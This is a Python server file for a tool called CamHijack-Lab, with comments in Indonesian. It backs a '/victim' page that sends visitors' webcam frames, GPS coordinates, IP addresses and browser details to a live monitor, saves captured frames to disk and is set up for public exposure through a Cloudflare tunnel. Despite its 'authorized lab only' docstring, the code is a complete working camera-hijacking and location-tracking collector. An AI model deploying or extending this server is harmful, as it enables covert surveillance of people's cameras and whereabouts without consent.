#!/usr/bin/env python3
"""CamHijack-Lab server · authorized lab demonstration only.

Aturan:
  - hanya deploy ke perangkat/direksikan ke target dalam lab yang sengaja disiapkan
  - semua stream & lokasi disimpan in-memory; satu-satunya tulisan ke disk
    adalah file bukti "capture frame" yang eksplisit
  - node kali, port 3040 (konvensi 30xx)
"""
import json, os, re, ssl, time, threading
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

ROOT = os.path.dirname(os.path.abspath(__file__))
PORT = int(os.environ.get("PORT", "3040"))
IDLE_TTL = 600
CAP_DIR = os.path.join(ROOT, "captures")

LOCK = threading.Lock()
SESSIONS = {}

def now():
    return time.time()

def get_session(sid, meta=None):
    with LOCK:
        s = SESSIONS.get(sid)
        if s is None:
            s = {"sid": sid, "created": now(), "last_seen": now(),
                 "frames": {}, "geo": None, "ua": "", "ip": "", "devices": {}, "select": None, "killed": False}
            SESSIONS[sid] = s
        else:
            s["last_seen"] = now()
        if meta:
            for k, v in meta.items():
                if v:
                    s[k] = v
        return s

def prune():
    with LOCK:
        dead = [k for k, v in SESSIONS.items() if now() - v["last_seen"] > IDLE_TTL]
        for k in dead:
            SESSIONS.pop(k, None)

class H(BaseHTTPRequestHandler):
    server_version = "camlab/1.0"
    def log_message(self, fmt, *args):
        try:
            with open(os.path.join(ROOT, "access.log"), "a") as f:
                f.write(time.strftime("%H:%M:%S") + " " + str(self.client_address[0]) + " " + (fmt % args) + "\n")
        except Exception:
            pass

    def _send(self, code, body, ctype="application/json"):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _body(self, limit=2_000_000):
        n = int(self.headers.get("Content-Length") or 0)
        if n > limit:
            self.close_connection = True
        return self.rfile.read(min(n, limit))

    def do_GET(self):
        p = self.path.split("?", 1)[0]
        if p in ("/", "/index.html"):
            return self._send(200, "cam-hijack-lab\nuse CLI:  " + os.path.join(ROOT, "camlab") + " new\n", "text/plain")
        m = re.fullmatch(r"/v/([A-Za-z0-9]+)", p)
        if m:
            with open(os.path.join(ROOT, "index.html"), "rb") as f:
                return self._send(200, f.read(), "text/html")
        if p == "/victim":
            with open(os.path.join(ROOT, "index.html"), "rb") as f:
                return self._send(200, f.read(), "text/html")
        m = re.fullmatch(r"/m/([A-Za-z0-9]+)", p)
        if m:
            with open(os.path.join(ROOT, "monitor.html"), "rb") as f:
                return self._send(200, f.read(), "text/html")
        if p == "/monitor":
            with open(os.path.join(ROOT, "monitor.html"), "rb") as f:
                return self._send(200, f.read(), "text/html")
        if p == "/diag":
            import html as _html
            prune()
            with LOCK:
                items = list(SESSIONS.values())
            items.sort(key=lambda x: -x["last_seen"])
            latest = next((x["sid"] for x in items if x["frames"].get("data")), items[0]["sid"] if items else None)
            rows = "".join(
                "<tr><td>" + _html.escape(x["sid"]) + "</td><td>" +
                ("CAM" if x["frames"].get("data") else "-") + "</td><td>" +
                _html.escape(x.get("ip", "")) + "</td><td>" +
                (("%.5f, %.5f" % (x["geo"]["lat"], x["geo"]["lon"])) if x.get("geo") else "-") +
                "</td></tr>" for x in items) or "<tr><td>(no sessions yet)</td></tr>"
            body = ('<!doctype html><html><head><meta charset=utf-8><title>DIAG camlab</title></head>'
                '<body style="font:14px monospace;background:#0d1420;color:#dbe4f0;padding:20px">'
                '<h2>CAM-LAB DIAGNOSTIC (tanpa JS)</h2>'
                '<p>server time : ' + time.strftime("%Y-%m-%d %H:%M:%S") + '</p>'
                '<table border=1 cellpadding=4 style="border-collapse:collapse">'
                '<tr><th>sid</th><th>cam</th><th>ip</th><th>geo</th></tr>' + rows + '</table>'
                '<h3>Live frame (dimuat server, tanpa JavaScript):</h3>'
                '<img src="/api/feed/' + (latest or "none") + '?t=1" style="max-width:100%;background:#000;border:1px solid #444">'
                '<p>Gambar di atas muncul? = browser kamu OK. Buka <a href="/monitor" style="color:#22c6b6">/monitor</a> di tab baru (bukan tab lama).</p>'
                '<p>Gambar rusak/kosong? Screenshot halaman ini.</p>'
                '</body></html>')
            return self._send(200, body, "text/html; charset=utf-8")
        if p == "/api/sessions":
            prune()
            with LOCK:
                items = [{"sid": s["sid"], "created": s["created"], "last_seen": s["last_seen"],
                          "geo": s["geo"], "ip": s["ip"], "ua": s["ua"],
                          "ndev": len(s.get("devices", {})), "select": s.get("select"),
                          "killed": bool(s.get("killed")),
                          "cam": bool(s["frames"].get("data")), "frame_ts": s["frames"].get("ts")}
                         for s in SESSIONS.values()]
            items.sort(key=lambda x: -x["last_seen"])
            return self._send(200, json.dumps(items))
        m = re.fullmatch(r"/api/feed/([^/]+)", p)
        if m:
            with LOCK:
                s_ = SESSIONS.get(m.group(1)) or {}
                sel, devs = s_.get("select"), s_.get("devices", {})
                f = (devs.get(sel) or {}).get("frame") or s_.get("frames", {}).get("data")
            if f:
                return self._send(200, f, "image/jpeg")
            return self._send(404, b"null")
        m = re.fullmatch(r"/api/devices/([^/]+)", p)
        if m:
            with LOCK:
                s_ = SESSIONS.get(m.group(1)) or {}
                sel = s_.get("select")
                items = [{"did": k, "ip": v.get("ip"), "ua": v.get("ua"),
                          "seen": v.get("last_seen"), "cam": bool(v.get("frame"))}
                         for k, v in s_.get("devices", {}).items()]
            items.sort(key=lambda x: -(x["seen"] or 0))
            return self._send(200, json.dumps({"sid": m.group(1), "select": sel, "devices": items}))
        m = re.fullmatch(r"/api/cmd/([^/]+)", p)
        if m:
            with LOCK:
                _s = SESSIONS.get(m.group(1)) or {}
                q = _s.get("cmds", [])
                out = list(q)
                dead = bool(_s.get("killed"))
                if "cmds" in _s:
                    _s["cmds"] = []
            return self._send(200, json.dumps({"cmds": out, "dead": dead}))
        if p == "/api/captures":
            items = sorted(os.listdir(CAP_DIR), reverse=True) if os.path.isdir(CAP_DIR) else []
            return self._send(200, json.dumps([f for f in items if f.endswith(".jpg")]))
        return self._send(404, b"null")

    def do_POST(self):
        parts = self.path.lstrip("/").split("/")
        if len(parts) < 3 or parts[0] != "api":
            return self._send(400, b"null")
        kind, sid = parts[1], parts[2]
        xff = self.headers.get("X-Forwarded-For")
        ip = xff.split(",")[0].strip() if xff else self.client_address[0]
        meta = {"ip": ip, "ua": self.headers.get("User-Agent", "")}
        if kind == "feed":
            data = self._body()
            if data and data[:2] == b"\xff\xd8":
                did = (self.headers.get("X-Did") or "").strip()[:32]
                s = get_session(sid, meta)
                with LOCK:
                    if s.get("killed"):
                        return self._send(200, b"ok")
                    if did:
                        d = s.setdefault("devices", {}).setdefault(did, {"frame": None})
                        d.update({"ip": meta.get("ip"), "ua": meta.get("ua"),
                                  "frame": data, "ts": now(), "last_seen": now()})
                    s["frames"] = {"data": data, "ts": now()}
                return self._send(200, b"ok")
            return self._send(400, b"null")
        if kind == "geo":
            try:
                d = json.loads(self._body(65536) or "{}")
            except Exception:
                return self._send(400, b"null")
            lat, lon = d.get("lat"), d.get("lon")
            if isinstance(lat, (int, float)) and isinstance(lon, (int, float)):
                s = get_session(sid, meta)
                with LOCK:
                    if not s.get("killed"):
                        s["geo"] = {"lat": lat, "lon": lon, "acc": d.get("acc"), "ts": now()}
                return self._send(200, b"ok")
            return self._send(400, b"null")
        if kind == "cmd":
            try:
                d = json.loads(self._body(1024) or "{}")
            except Exception:
                return self._send(400, b"null")
            act = d.get("act")
            if act not in ("flip",):
                return self._send(400, b"null")
            s_ = get_session(sid, meta)
            with LOCK:
                s_.setdefault("cmds", []).append({"act": act, "to": s_.get("select") or "auto"})
            return self._send(200, b"ok")
        if kind == "select":
            try:
                d = json.loads(self._body(1024) or "{}")
            except Exception:
                return self._send(400, b"null")
            did = d.get("did")
            s = get_session(sid, meta)
            with LOCK:
                devs = s.setdefault("devices", {})
                s["select"] = did if did in devs else None
                sel = s["select"]
            return self._send(200, json.dumps({"select": sel}))
        if kind == "kill":
            s = get_session(sid, meta)
            with LOCK:
                s["killed"] = True
                s["frames"] = {}
                s["geo"] = None
                s["select"] = None
                for _d in s.get("devices", {}).values():
                    _d["frame"] = None
                    _d["ts"] = 0
            return self._send(200, json.dumps({"killed": True, "sid": sid}))
        if kind == "capture":
            with LOCK:
                s_ = SESSIONS.get(sid) or {}
                f = ((s_.get("devices", {}).get(s_.get("select")) or {}).get("frame")
                     or s_.get("frames", {}).get("data"))
            if not f:
                return self._send(404, b"null")
            os.makedirs(CAP_DIR, exist_ok=True)
            name = f"{sid}_{time.strftime('%Y%m%d-%H%M%S')}.jpg"
            with open(os.path.join(CAP_DIR, name), "wb") as fh:
                fh.write(f)
            return self._send(200, json.dumps({"file": name}))
        return self._send(404, b"null")

def main():
    os.makedirs(CAP_DIR, exist_ok=True)
    # origin plain-HTTP loopback untuk cloudflare tunnel (tidak ke LAN)
    origin_port = int(os.environ.get("CAMLAB_ORIGIN_PORT") or PORT + 1)
    origin = ThreadingHTTPServer(("127.0.0.1", origin_port), H)
    threading.Thread(target=origin.serve_forever, daemon=True).start()
    srv = ThreadingHTTPServer(("0.0.0.0", PORT), H)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(os.path.join(ROOT, ".cert", "cert.pem"), os.path.join(ROOT, ".cert", "key.pem"))
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print("camlab: https :%d  +  http origin 127.0.0.1:%d (tunnel)" % (PORT, origin_port))
    srv.serve_forever()

if __name__ == "__main__":
    main()
